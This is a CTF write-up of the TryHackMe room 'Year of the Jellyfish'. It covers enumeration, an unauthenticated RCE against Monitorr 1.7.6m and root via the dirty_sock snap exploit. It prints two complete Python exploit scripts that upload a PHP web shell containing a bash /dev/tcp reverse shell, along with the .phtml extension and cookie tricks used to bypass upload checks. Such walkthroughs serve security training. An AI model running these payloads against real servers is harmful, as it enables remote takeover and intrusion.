# Year Of The Jellyfish TryHackMe Writeup
> Note: This box uses a public IP address, you need to add this to /etc/hosts the same as you would in any other box.  

### Initial enumeration  
```
Open 54.229.240.57:21
Open 54.229.240.57:22
Open 54.229.240.57:80
Open 54.229.240.57:443
Open 54.229.240.57:554
Open 54.229.240.57:7070
Open 54.229.240.57:8000
Open 54.229.240.57:8096
```
After running rustscan, I pass the output to an nmap scan with the -a switch. 
There are a few potential attack vectors present but before we start further enumeration, it's important we go through the output of our scan.
We can see there's a domain and subdomains listen to use in the SSL cert and HTTP server redirect:  
![image](https://user-images.githubusercontent.com/65077960/125059255-0437f800-e0a3-11eb-94a7-72b8e3cfeab3.png)

We'll add this to our /etc/hosts file:
* robyns-petshop.thm
* monitorr.robyns-petshop.thm
* dev.robyns-petshop.thm
* beta.robyns-petshop.thm

Let's take a look around the different websites, starting with https://robyns-petshop.thm
![image](https://user-images.githubusercontent.com/65077960/125059929-c1c2eb00-e0a3-11eb-85dd-da6249113046.png)

As expected, it's a petshop. What about the other subdomains?  
https://monitorr.robyns-petshop.thm/    
![image](https://user-images.githubusercontent.com/65077960/125060084-e6b75e00-e0a3-11eb-830b-c6ad9b9540e2.png)  
https://beta.robyns-petshop.thm/  
![image](https://user-images.githubusercontent.com/65077960/125060178-fe8ee200-e0a3-11eb-9c5f-977d3ca2d559.png)  
https://dev.robyns-petshop.thm/  
![image](https://user-images.githubusercontent.com/65077960/125060262-17979300-e0a4-11eb-8086-6a764684248d.png)  

Monitorr looks interesting, let's enumerate it:  
We can see that it's running monitorr version 1.7.6m, after googling that we can see it's vulnerable to two different exploits:  
* https://www.exploit-db.com/exploits/48980 <RCE>
* https://www.exploit-db.com/exploits/48981 <Auth Bypass>

The RCE exploit we have is unauthenticated so let's try it. The exploit from exploitDB needs a few changes, we'll need to use dos2unix and import urllib3 to ignore the HTTPS self signed cert error. Our code ends up looking like this:  
```py                       
#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    sess.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    sess.get(url, headers=headers)
```
Alright now that we've got our exploit, let's run it and try get a reverse shell:  
```
python3 exploit.py https://monitorr.robyns-petshop.thm/ 10.9.15.124 4444
```
and we get nothing. When we navigate to the directory listed [here](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/). This had me stumped for a while so I decided  to take a look at the upload.php to see what errors there were:  
![image](https://user-images.githubusercontent.com/65077960/125064720-d9e93900-e0a8-11eb-83c7-900be503fd95.png)

### User own
It appears there was some manual patch for this, where only images of x size are allowed. Let's try again.  
After intercepting requests and checking the response, I noticed that we're detected as an exploit. Why's that?  
Well if we look at our cookies, we have a cookie called isHuman and a PHP session ID:
![image](https://user-images.githubusercontent.com/65077960/125066693-33eafe00-e0ab-11eb-8f51-48eb72906419.png)  
Let's try run our exploit again, but this time we'll use a double extension to bypass the file type check:  
> Initially I tried using just .php but that was detected, when talking with others we figured that .phtml worked better:  
```
#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
	url = sys.argv[1] + "/assets/php/upload.php"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

	data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.jpg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

	r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})

	print ("A shell script should be uploaded. Now we try to execute it")
	url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpg.phtml"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	sess.get(url, headers=headers)
```
We can run this using:
```
python3 exploit3.py https://monitorr.robyns-petshop.thm/ 10.9.15.124 4444
```
And.. nothing! The file was uplaoded to https://monitorr.robyns-petshop.thm/assets/data/usrimg/ but we can't get a reverse shell. What if there's a firewall? Let's try some common ports. I started by trying 8080, that didn't work. What about 443? Since we know that's open:  
> Note: I had to change the filename since we can't overwrite uploaded files, change that in the python script   

![image](https://user-images.githubusercontent.com/65077960/125068827-cf7d6e00-e0ad-11eb-8943-0939b37b559d.png)
It worked, we now have a reverse shell. The user flag can be found in /var/www/

### Root own
Let's try priv esc, as always we'll use upgrade our shell using pty:  
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
I tried to download linpeas via a python server but that didn't work. I remember that this box uses a public IP address, so we can just download it straight from github:  
![image](https://user-images.githubusercontent.com/65077960/125070136-98a85780-e0af-11eb-9f6f-984dbc0e1279.png)

There's a lot to sift through but the important part is the snap version:  
![image](https://user-images.githubusercontent.com/65077960/125070644-26844280-e0b0-11eb-9a80-409de5cf43b3.png)

We can try use [dirty socks](https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py) to get root. 
> Remember we have an internet connection, we can just download it from the github.  

![image](https://user-images.githubusercontent.com/65077960/125070781-55021d80-e0b0-11eb-8f83-94a1d13724cf.png)

The exploit was a success!  
![image](https://user-images.githubusercontent.com/65077960/125070921-7fec7180-e0b0-11eb-8433-835fca83dce5.png)

We can now su into dirty_sock and run commands as a sudoer!  
![image](https://user-images.githubusercontent.com/65077960/125071305-0608b800-e0b1-11eb-90c4-3aaacb432fd5.png)
The root flag is at /root/root.txt


